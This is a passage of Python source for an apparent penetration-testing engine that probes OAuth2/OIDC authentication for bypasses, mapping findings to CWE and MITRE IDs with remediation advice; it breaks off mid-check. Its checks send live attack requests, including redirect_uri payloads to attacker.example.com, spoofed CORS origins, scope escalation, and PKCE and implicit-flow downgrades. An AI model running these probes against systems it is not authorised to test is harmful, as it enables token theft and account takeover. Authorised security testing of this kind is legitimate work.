"""
Expedite Strike -- Universal Authentication Bypass Assessment Engine
===================================================================
Automated multi-protocol authentication security assessment for
authorised penetration testing engagements.

Assessment Modules
------------------
OA  OAuth2 / OIDC             (OA-01 - OA-12)
SA  SAML 2.0                  (SA-01 - SA-06)
JW  JWT Attacks               (JW-01 - JW-08)
MS  Multi-Step / Step-Up Auth (MS-01 - MS-05)
PP  Password Page             (PP-01 - PP-06)
PR  Password Reset            (PR-01 - PR-05)
EN  Account Enumeration       (EN-01 - EN-04)
SL  Social Login              (SL-01 - SL-04)
BA  Basic / Digest Auth       (BA-01 - BA-04)
AK  API Key / Bearer Token    (AK-01 - AK-04)
SE  Session Management        (SE-01 - SE-05)
LD  LDAP Injection            (LD-01 - LD-04)
XW  SAML Signature Wrapping   (XW-01 - XW-03)
RM  Response Manipulation     (RM-01 - RM-04)
HH  Host Header Injection     (HH-01 - HH-03)

References
----------
- OWASP Web Security Testing Guide v4.2
- OWASP Top 10 2021 -- A07: Identification and Authentication Failures
- MITRE ATT&CK Enterprise: Credential Access / Defense Evasion
- NIST SP 800-63B (Digital Identity Guidelines)
- RFC 6749 OAuth 2.0, RFC 7519 JWT, RFC 7522 SAML Bearer
- CREST CPSA/CRT Technical Standards
- PTES Penetration Testing Execution Standard v1.1
"""

import os
import re
import time
import json
import base64
import hashlib
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

_log_fn: Optional[Callable] = None


def _log(msg: str) -> None:
    if _log_fn:
        _log_fn(msg)
    else:
        print(f"[AUTH-BYPASS] {msg}")


# ---------------------------------------------------------------------------
# Data Models
# ---------------------------------------------------------------------------

@dataclass
class AuthTarget:
    """Describes the target application and authentication configuration."""
    url: str
    protocol: str = "auto"
    auth_mode: str = "form"
    username: str = ""
    password: str = ""
    session_cookie: str = ""
    bearer_token: str = ""
    api_key: str = ""
    extra_headers: Dict[str, str] = field(default_factory=dict)
    proxy: str = ""
    timeout: int = 12
    follow_redirects: bool = True
    verbose: bool = False

    def __post_init__(self):
        if self.url:
            u = self.url.strip()
            if not u.startswith(("http://", "https://")):
                u = "https://" + u
            self.url = u

    @property
    def base_url(self) -> str:
        if not self.url:
            return ""
        p = urllib.parse.urlparse(self.url)
        return f"{p.scheme}://{p.netloc}"

    @property
    def hostname(self) -> str:
        p = self.parsed
        return p.hostname or ""

    @property
    def path(self) -> str:
        p = self.parsed
        return p.path or "/"

    @property
    def parsed(self):
        return urllib.parse.urlparse(self.url)


def probe_target_health(target: AuthTarget, timeout: int = 5) -> dict:
    """
    Perform a rapid pre-flight connectivity, TLS, and WAF fingerprinting probe.
    """
    if not _REQUESTS_OK or not target.url:
        return {
            "reachable": False, "status_code": 0, "waf": None,
            "tls_valid": False, "latency_ms": 0, "error": "Requests library or URL missing"
        }

    start = time.monotonic()
    s = _session(target)
    try:
        r = s.get(target.url, timeout=timeout, allow_redirects=True)
        latency = int((time.monotonic() - start) * 1000)
        
        server_hdr = r.headers.get("Server", "").lower()
        waf = None
        if "cloudflare" in server_hdr or "__cf_bm" in r.cookies or "cf-ray" in r.headers:
            waf = "Cloudflare WAF / CDN"
        elif "awselb" in server_hdr or "x-amz-cf-id" in r.headers:
            waf = "AWS WAF / CloudFront"
        elif "akamai" in server_hdr or "akamai-origin-hop" in r.headers:
            waf = "Akamai Kona WAF"
        elif "imperva" in server_hdr or "incap_ses" in r.cookies or "x-iinfo" in r.headers:
            waf = "Imperva Incapsula WAF"
        elif "sucuri" in server_hdr or "x-sucuri-id" in r.headers:
            waf = "Sucuri CloudProxy WAF"
        elif "fastly" in server_hdr or "x-fastly-request-id" in r.headers:
            waf = "Fastly WAF / CDN"
        elif "big-ip" in server_hdr or "f5" in server_hdr:
            waf = "F5 BIG-IP ASM"
        elif "azure" in server_hdr or "x-ms-request-id" in r.headers:
            waf = "Azure Front Door / WAF"

        return {
            "reachable": True,
            "status_code": r.status_code,
            "latency_ms": latency,
            "waf": waf,
            "server": r.headers.get("Server", "Unknown"),
            "content_type": r.headers.get("Content-Type", ""),
            "redirects": len(r.history),
            "final_url": r.url,
            "error": None
        }
    except Exception as exc:
        return {
            "reachable": False, "status_code": 0, "waf": None,
            "tls_valid": False, "latency_ms": 0, "error": str(exc)
        }


@dataclass
class AuthFinding:
    """Result of a single authentication bypass check."""
    check_id: str
    protocol: str
    title: str
    status: str          # VULNERABLE | SECURE | NOT_APPLICABLE | ERROR
    severity: str        # Critical | High | Medium | Low | Info
    cvss_score: float
    mitre_id: str
    mitre_name: str
    cwe: str
    owasp: str
    crest: str
    ptes: str
    evidence: str
    recommendation: str
    request_dump: str = ""
    response_dump: str = ""
    references: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        return d


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _f(check_id, protocol, title, status, severity, cvss, mitre_id, mitre_name,
       cwe, owasp, crest, ptes, evidence, recommendation,
       req="", resp="", refs=None) -> AuthFinding:
    return AuthFinding(
        check_id=check_id, protocol=protocol, title=title, status=status,
        severity=severity, cvss_score=cvss, mitre_id=mitre_id,
        mitre_name=mitre_name, cwe=cwe, owasp=owasp, crest=crest, ptes=ptes,
        evidence=evidence, recommendation=recommendation,
        request_dump=req, response_dump=resp, references=refs or [],
    )


def _session(target: AuthTarget):
    """Build a pre-configured requests.Session."""
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Expedite Strike Auth Auditor/3.0; "
            "+https://expedite.security)"
        ),
        "Accept": "application/json, text/html, */*",
        "Accept-Language": "en-US,en;q=0.9",
    })
    if target.session_cookie:
        s.headers["Cookie"] = target.session_cookie
    if target.bearer_token:
        s.headers["Authorization"] = f"Bearer {target.bearer_token}"
    if target.api_key:
        s.headers["X-API-Key"] = target.api_key
    s.headers.update(target.extra_headers)
    if target.proxy:
        s.proxies = {"http": target.proxy, "https": target.proxy}
    return s


def _na(check_id, protocol, title) -> AuthFinding:
    return _f(check_id, protocol, title, "NOT_APPLICABLE", "Info", 0.0,
              "", "", "", "", "", "",
              "Check not applicable to the detected target configuration.",
              "No action required.")


def _err(check_id, protocol, title, exc) -> AuthFinding:
    return _f(check_id, protocol, title, "ERROR", "Info", 0.0,
              "", "", "", "", "", "",
              f"Check raised an exception: {exc}",
              "Review engine logs and target connectivity.")


def _jwt_decode_header(token: str) -> Optional[dict]:
    try:
        header_b64 = token.split(".")[0]
        pad = 4 - len(header_b64) % 4
        header_bytes = base64.urlsafe_b64decode(header_b64 + "=" * pad)
        return json.loads(header_bytes)
    except Exception:
        return None


def _jwt_rebuild(token: str, new_header: dict, new_payload: dict = None,
                 signature: str = "") -> str:
    """Rebuild a JWT with modified header/payload, and optionally no signature."""
    parts = token.split(".")
    h = base64.urlsafe_b64encode(
        json.dumps(new_header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    if new_payload is not None:
        try:
            pad = 4 - len(parts[1]) % 4
            payload_data = json.loads(
                base64.urlsafe_b64decode(parts[1] + "=" * pad)
            )
            payload_data.update(new_payload)
            p = base64.urlsafe_b64encode(
                json.dumps(payload_data, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
        except Exception:
            p = parts[1]
    else:
        p = parts[1]
    sig = signature if signature else (parts[2] if len(parts) > 2 else "")
    return f"{h}.{p}.{sig}"


# ---------------------------------------------------------------------------
# Protocol auto-detection
# ---------------------------------------------------------------------------

def detect_protocol(url: str) -> str:
    """Heuristically detect auth protocol from URL."""
    u = url.lower()
    if any(x in u for x in ["oauth2", "oauth/authorize", "openid", "oidc",
                             "response_type=", "client_id="]):
        return "oauth2"
    if any(x in u for x in ["samlrequest", "samlresponse", "/saml", "/sso/"]):
        return "saml"
    if any(x in u for x in ["jwt", "token="]):
        return "jwt"
    if any(x in u for x in ["/reset", "/forgot", "reset_token"]):
        return "reset"
    if any(x in u for x in ["login", "signin", "sign-in", "auth", "password"]):
        return "password"
    return "auto"


# ---------------------------------------------------------------------------
# OA -- OAuth2 / OIDC (12 checks)
# ---------------------------------------------------------------------------

def _check_oa01(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-01: redirect_uri Open Redirect"""
    _CID = "OA-01"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "redirect_uri Open Redirect"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "redirect_uri" not in params:
            return _na(_CID, _PROTO, _TITLE)
        legit = params["redirect_uri"]
        legit_host = urllib.parse.urlparse(legit).netloc or legit
        payloads = [
            "https://attacker.example.com/callback",
            f"https://{legit_host}.attacker.example.com/",
            f"https://attacker.example.com@{legit_host}/",
            f"https://{legit_host}/../../attacker",
            legit.replace("https://", "http://attacker.example.com/?x="),
            f"//attacker.example.com/%2F{legit_host}",
        ]
        s = _session(target)
        vulnerable_payloads = []
        for p in payloads:
            test_params = {**params, "redirect_uri": p}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_params))
            )
            try:
                r = s.get(test_url, timeout=timeout, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "attacker.example.com" in loc:
                    vulnerable_payloads.append(
                        f"payload={p!r} -> Location: {loc[:120]}"
                    )
            except Exception:
                pass
        if vulnerable_payloads:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.4,
                      "T1550.001", "Application Access Token",
                      "CWE-601", "A07:2021 - Identification and Authentication Failures",
                      "CB-3.5 - OAuth 2.0 Security", "PTES-6.1 - Authentication Testing",
                      f"Server redirects to attacker-controlled domain: "
                      f"{'; '.join(vulnerable_payloads[:2])}",
                      "Enforce strict exact-match whitelist validation of redirect_uri "
                      "against pre-registered values. Reject partial matches.",
                      refs=["RFC 6749 S10.6", "OWASP WSTG-ATHZ-05"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.4,
                  "T1550.001", "Application Access Token",
                  "CWE-601", "A07:2021",
                  "CB-3.5", "PTES-6.1",
                  f"All {len(payloads)} redirect_uri bypass payloads were rejected.",
                  "Continue enforcing strict whitelist validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa02(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-02: State Parameter CSRF"""
    _CID = "OA-02"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "State Parameter CSRF"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "response_type" not in params and "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        issues = []
        if "state" not in params:
            issues.append("No state parameter present in authorize request")
        s = _session(target)
        no_state = {k: v for k, v in params.items() if k != "state"}
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(no_state))
        )
        try:
            r = s.get(test_url, timeout=timeout, allow_redirects=False)
            if r.status_code in (302, 301):
                loc = r.headers.get("Location", "")
                if "code=" in loc or "token=" in loc:
                    issues.append(
                        f"Server issued auth code without state param "
                        f"(HTTP {r.status_code}, Location contains code)"
                    )
        except Exception:
            pass
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-352", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(issues),
                      "Require a cryptographically random, unguessable state "
                      "parameter on every authorization request and validate it "
                      "on the callback.",
                      refs=["RFC 6749 S10.12", "OWASP WSTG-SESS-05"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-352", "A07:2021", "CB-3.5", "PTES-6.1",
                  "State parameter is present and server rejected stateless request.",
                  "Maintain state parameter enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa03(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-03: Response Type Confusion (implicit flow)"""
    _CID = "OA-03"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "Response Type Confusion / Implicit Flow Enabled"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "response_type" not in params:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        results = []
        for rt in ["token", "id_token", "token id_token"]:
            test_p = {**params, "response_type": rt}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_p))
            )
            try:
                r = s.get(test_url, timeout=timeout, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "access_token=" in loc or "id_token=" in loc:
                    results.append(
                        f"response_type={rt!r} accepted -> "
                        f"token in Location fragment"
                    )
                elif r.status_code not in (400, 401, 403):
                    results.append(
                        f"response_type={rt!r} not rejected "
                        f"(HTTP {r.status_code})"
                    )
            except Exception:
                pass
        if results:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.5,
                      "T1550.001", "Application Access Token",
                      "CWE-284", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(results),
                      "Restrict allowed response_type values to 'code' only. "
                      "Disable implicit and hybrid flows unless strictly required.",
                      refs=["OAuth 2.0 Security BCP draft-ietf-oauth-security-topics"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.5,
                  "T1550.001", "Application Access Token",
                  "CWE-284", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Server correctly rejects implicit/hybrid response_type values.",
                  "Maintain allowlist of permitted response_type values.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa04(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-04: PKCE Downgrade"""
    _CID = "OA-04"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "PKCE Downgrade Attack"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        has_pkce = "code_challenge" in params
        if not has_pkce:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.9,
                      "T1550.001", "Application Access Token",
                      "CWE-327", "A07:2021", "CB-3.5", "PTES-6.1",
                      "No code_challenge parameter in authorize request. "
                      "PKCE is not enforced, enabling authorization code interception.",
                      "Enforce PKCE (RFC 7636) with code_challenge_method=S256 "
                      "for all clients, including server-side clients.",
                      refs=["RFC 7636", "OAuth 2.0 Security BCP S2.1.1"])
        no_pkce_params = {
            k: v for k, v in params.items()
            if k not in ("code_challenge", "code_challenge_method")
        }
        s = _session(target)
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(no_pkce_params))
        )
        r = s.get(test_url, timeout=timeout, allow_redirects=False)
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if "code=" in loc:
                return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.9,
                          "T1550.001", "Application Access Token",
                          "CWE-327", "A07:2021", "CB-3.5", "PTES-6.1",
                          f"Server issued authorization code even when "
                          f"code_challenge was removed (HTTP {r.status_code}).",
                          "Reject authorization requests that omit code_challenge "
                          "when the client is registered as a PKCE client.",
                          refs=["RFC 7636", "OAuth 2.0 Security BCP S2.1.1"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.9,
                  "T1550.001", "Application Access Token",
                  "CWE-327", "A07:2021", "CB-3.5", "PTES-6.1",
                  "PKCE is enforced: request without code_challenge was rejected.",
                  "Maintain PKCE enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa05(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-05: Well-Known Endpoint Exposure"""
    _CID = "OA-05"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "OIDC Well-Known / Discovery Endpoint Exposure"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        paths = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/.well-known/jwks.json",
        ]
        s = _session(target)
        discovered = []
        for path in paths:
            try:
                r = s.get(base + path, timeout=timeout, allow_redirects=True)
                if r.status_code == 200 and (
                    "jwks_uri" in r.text or "issuer" in r.text
                    or "keys" in r.text
                ):
                    discovered.append(f"{path} (HTTP 200, {len(r.text)} bytes)")
            except Exception:
                pass
        if discovered:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Info", 0.0,
                      "T1590", "Gather Victim Network Information",
                      "CWE-200", "A05:2021", "CB-3.5", "PTES-5.1",
                      f"Discovery endpoints exposed: {'; '.join(discovered)}",
                      "Restrict access to OIDC discovery documents to known "
                      "clients or behind authentication. Minimise information "
                      "disclosed in the discovery document.",
                      refs=["OpenID Connect Discovery 1.0", "RFC 8414"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Info", 0.0,
                  "T1590", "Gather Victim Network Information",
                  "CWE-200", "A05:2021", "CB-3.5", "PTES-5.1",
                  "No well-known/discovery endpoints returned useful content.",
                  "Discovery endpoints are appropriately restricted.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa06(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-06: Scope Escalation"""
    _CID = "OA-06"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "OAuth2 Scope Escalation"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "scope" not in params and "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        priv_scopes = "admin write offline_access api superuser manage"
        test_params = {**params, "scope": priv_scopes}
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_params))
        )
        s = _session(target)
        r = s.get(test_url, timeout=timeout, allow_redirects=False)
        if r.status_code in (301, 302) and r.headers.get("Location"):
            loc = r.headers["Location"]
            if "error" not in loc.lower():
                return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 6.3,
                          "T1548", "Abuse Elevation Control Mechanism",
                          "CWE-269", "A07:2021", "CB-3.5", "PTES-6.1",
                          f"Server accepted privileged scope string "
                          f"({priv_scopes!r}) without error "
                          f"(HTTP {r.status_code}, Location: {loc[:100]})",
                          "Maintain a server-side whitelist of permitted scopes "
                          "per client_id and reject requests containing "
                          "unpermitted scopes with error=invalid_scope.",
                          refs=["RFC 6749 S3.3", "OAuth 2.0 Security BCP"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 6.3,
                  "T1548", "Abuse Elevation Control Mechanism",
                  "CWE-269", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Server correctly rejected unpermitted scope escalation "
                  f"(HTTP {r.status_code}).",
                  "Maintain scope whitelist enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa07(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-07: Token Leakage via Referrer"""
    _CID = "OA-07"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "Token Leakage via Referrer Header"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout, allow_redirects=False)
        rp = r.headers.get("Referrer-Policy", "")
        issues = []
        if not rp:
            issues.append("No Referrer-Policy header set on authorize endpoint")
        elif rp.lower() in ("unsafe-url", "no-referrer-when-downgrade"):
            issues.append(
                f"Permissive Referrer-Policy: {rp!r} - tokens in URL may leak"
            )
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        for k in ("access_token", "token", "id_token", "code"):
            if k in params:
                issues.append(
                    f"Sensitive parameter {k!r} present in URL query string"
                )
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.3,
                      "T1040", "Network Sniffing",
                      "CWE-200", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(issues),
                      "Set Referrer-Policy: no-referrer or strict-origin on all "
                      "auth endpoints. Never include tokens in URL query strings.",
                      refs=["W3C Referrer-Policy", "RFC 6750 S5.3"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.3,
                  "T1040", "Network Sniffing",
                  "CWE-200", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Referrer-Policy header present: {rp!r}. "
                  "No tokens in URL query string.",
                  "Maintain Referrer-Policy enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa08(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-08: Token Endpoint CORS Misconfiguration"""
    _CID = "OA-08"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "Token Endpoint CORS Misconfiguration"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        # Try to discover token endpoint
        token_ep = None
        for disc in ["/.well-known/openid-configuration",
                     "/.well-known/oauth-authorization-server"]:
            try:
                s = _session(target)
                dr = s.get(base + disc, timeout=timeout)
                if dr.status_code == 200:
                    data = dr.json()
                    token_ep = data.get("token_endpoint")
                    break
            except Exception:
                pass
        if not token_ep:
            parsed = urllib.parse.urlparse(target.url)
            token_ep = f"{base}{parsed.path.rsplit('/authorize', 1)[0]}/token"
        s = _session(target)
        s.headers["Origin"] = "https://attacker.example.com"
        try:
            r = s.options(token_ep, timeout=timeout)
        except Exception:
            r = s.get(token_ep, timeout=timeout)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao in ("*",) or (
            "attacker.example.com" in acao and acac.lower() == "true"
        ):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.5,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-942", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Token endpoint {token_ep!r} returns permissive CORS: "
                      f"ACAO={acao!r}, ACAC={acac!r}",
                      "Restrict CORS on the token endpoint to only authorised "
                      "origins. Never allow wildcard (*) CORS on auth endpoints.",
                      refs=["RFC 6749", "OWASP CORS Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.5,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-942", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Token endpoint CORS headers are appropriately restrictive: "
                  f"ACAO={acao!r}.",
                  "Maintain restrictive CORS policy on token endpoint.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa09(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-09: client_id Enumeration"""
    _CID = "OA-09"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "OAuth2 client_id Enumeration"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        real_id = params["client_id"]
        fake_ids = ["test", "dev", "mobile", "api", "admin",
                    "testclient", "development"]
        responses = {}
        for cid in [real_id] + fake_ids[:3]:
            tp = {**params, "client_id": cid}
            tu = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(tp))
            )
            try:
                r = s.get(tu, timeout=timeout, allow_redirects=False)
                responses[cid] = (r.status_code, len(r.text))
            except Exception:
                responses[cid] = (0, 0)
        real_code, real_len = responses[real_id]
        enum_evidence = []
        for cid in fake_ids[:3]:
            code, length = responses.get(cid, (0, 0))
            if code != real_code or abs(length - real_len) > 100:
                enum_evidence.append(
                    f"client_id={cid!r} -> HTTP {code}, "
                    f"body {length}B vs real HTTP {real_code}, {real_len}B"
                )
        if enum_evidence:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.0,
                      "T1592", "Gather Victim Host Information",
                      "CWE-203", "A07:2021", "CB-3.5", "PTES-5.1",
                      "Different server responses for valid vs invalid client_id: "
                      + "; ".join(enum_evidence),
                      "Return identical error responses for invalid client_id "
                      "values to prevent enumeration.",
                      refs=["RFC 6749 S4.1.2.1"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.0,
                  "T1592", "Gather Victim Host Information",
                  "CWE-203", "A07:2021", "CB-3.5", "PTES-5.1",
                  "Server returns consistent responses for valid and invalid "
                  "client_id values.",
                  "Maintain consistent error responses.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa10(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-10: Implicit Flow Still Supported"""
    _CID = "OA-10"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "Implicit Flow Still Supported"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "response_type" not in params and "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        test_p = {**params, "response_type": "token"}
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_p))
        )
        r = s.get(test_url, timeout=timeout, allow_redirects=False)
        loc = r.headers.get("Location", "")
        if "access_token=" in loc or (
            r.status_code in (200, 302) and "error" not in loc.lower()
        ):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.4,
                      "T1550.001", "Application Access Token",
                      "CWE-284", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Implicit flow (response_type=token) accepted by server "
                      f"(HTTP {r.status_code}). Tokens returned in URL fragment "
                      "are exposed to browser history, referrer headers and logs.",
                      "Disable the implicit grant type. Use authorization code "
                      "flow with PKCE instead.",
                      refs=["OAuth 2.0 Security BCP S2.1.2", "RFC 9700"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.4,
                  "T1550.001", "Application Access Token",
                  "CWE-284", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Implicit flow rejected (HTTP {r.status_code}).",
                  "Maintain implicit flow rejection.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa11(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-11: Nonce Reuse (OIDC)"""
    _CID = "OA-11"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "OIDC Nonce Reuse"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        fixed_nonce = "FIXED_NONCE_EXPSTRIKE_12345"
        test_p = {**params, "nonce": fixed_nonce}
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_p))
        )
        codes = []
        for _ in range(2):
            try:
                r = s.get(test_url, timeout=timeout, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "code=" in loc:
                    code = urllib.parse.parse_qs(
                        urllib.parse.urlparse(loc).query
                    ).get("code", [""])[0]
                    if code:
                        codes.append(code)
            except Exception:
                pass
        if len(codes) >= 2:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.3,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-330", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Server issued {len(codes)} auth codes with the same "
                      f"fixed nonce value. Nonce replay may be possible.",
                      "Validate nonce uniqueness server-side. Bind the nonce "
                      "to the user session and reject reuse.",
                      refs=["OpenID Connect Core 1.0 S3.1.2.1"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.3,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-330", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Server did not return multiple codes for a fixed nonce.",
                  "Maintain nonce validation enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_oa12(target: AuthTarget, timeout: int) -> AuthFinding:
    """OA-12: Authorization Code Reuse / Single-Use Enforcement"""
    _CID = "OA-12"
    _PROTO = "OAuth2/OIDC"
    _TITLE = "Authorization Code Single-Use Enforcement"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "client_id" not in params:
            return _na(_CID, _PROTO, _TITLE)
        base = target.base_url
        token_ep = None
        try:
            s = _session(target)
            dr = s.get(
                base + "/.well-known/openid-configuration", timeout=timeout
            )
            if dr.status_code == 200:
                token_ep = dr.json().get("token_endpoint")
        except Exception:
            pass
        if not token_ep:
            return _f(_CID, _PROTO, _TITLE, "NOT_APPLICABLE", "High", 7.5,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-294", "A07:2021", "CB-3.5", "PTES-6.1",
                      "Token endpoint not discoverable; cannot test code reuse "
                      "without completing a full auth flow.",
                      "Ensure authorization codes are single-use, bound to the "
                      "original redirect_uri and client_id, and expire within 60s.",
                      refs=["RFC 6749 S4.1.2", "RFC 6749 S10.5"])
